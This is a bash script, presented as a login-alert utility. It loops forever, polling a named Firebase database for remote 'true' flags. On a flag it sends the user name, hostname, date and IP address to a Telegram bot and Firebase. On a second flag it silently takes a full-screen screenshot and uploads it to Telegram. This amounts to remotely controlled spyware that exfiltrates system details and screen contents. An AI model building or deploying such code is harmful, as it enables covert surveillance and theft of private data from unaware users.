#!/bin/bash

# ===== CONFIGURATION =====
BOT_TOKEN=""
CHAT_ID=""
DB_URL="" # Firebase DB URL

USERNAME="$USER"
DATE="$(date)"
HOSTNAME="$(hostname)"
IP_ADDR=$(hostname -I | awk '{print $1}') 
SCREENSHOT_PATH="/tmp/screenshot.png"  # Define the path for the screenshot

# ===== FUNCTION: Send Telegram Alert =====
send_telegram_alert() {
    local date="$(date)"
    local hostname="$(hostname)"
    local ip_address=$(hostname -I | awk '{print $1}')

    local message="🔔 Login Alert!
👤 User: $USERNAME
📅 Date: $date
💻 Hostname: $hostname
🌐 IP Address: $ip_address"

    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
         -d chat_id="$CHAT_ID" \
         -d text="$message"
}

# ===== FUNCTION: Send Firebase Data =====
send_to_firebase() {
    local date="$(date)"
    local hostname="$(hostname)"
    local ip_address=$(hostname -I | awk '{print $1}')

    curl -s -X POST -H "Content-Type: application/json" \
         -d "{
               \"user\": \"$USERNAME\",
               \"date\": \"$date\",
               \"hostname\": \"$hostname\",
               \"ip_address\": \"$ip_address\"
             }" \
         "$DB_URL/logins/$USERNAME.json"
}

# ===== FUNCTION: Take Screenshot (using ImageMagick) =====
take_screenshot() {
    echo "📷 Taking a screenshot silently..."
    
    # Use 'import' from ImageMagick to capture the full screen
    import -window root "$SCREENSHOT_PATH"  # Adjust if you need to capture specific window
}

# ===== FUNCTION: Send Screenshot to Telegram =====
send_screenshot_to_telegram() {
    echo "📤 Sending screenshot to Telegram..."
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto" \
         -F chat_id="$CHAT_ID" \
         -F photo="@$SCREENSHOT_PATH"  # Upload the screenshot
}

# ===== Infinite loop: Check Firebase and perform actions =====
while true; do
    echo "📡 Checking Firebase at $(date)..."

    response=$(curl -s "https://dixitcoder-tools-ai-default-rtdb.europe-west1.firebasedatabase.app/dixitcoder.json")

    echo "📥 Response: $response"

    if [[ "$response" == "true" ]]; then
        echo "✅ Response is true — performing actions"
        send_telegram_alert
        send_to_firebase
    else
        echo "❌ Response is not true — skipping"
    fi

    # Check if the 'call_screen' value is true in Firebase
    call_screen=$(curl -s "https://dixitcoder-tools-ai-default-rtdb.europe-west1.firebasedatabase.app/loginscreen.json")

    echo "📥 Response from call_screen: $call_screen"

    if [[ "$call_screen" == "true" ]]; then
        take_screenshot
        send_screenshot_to_telegram
    else
        echo "❌ Call screen is not true — skipping"
    fi

    echo "⏳ Sleeping for 10 seconds..."
    sleep 10
done
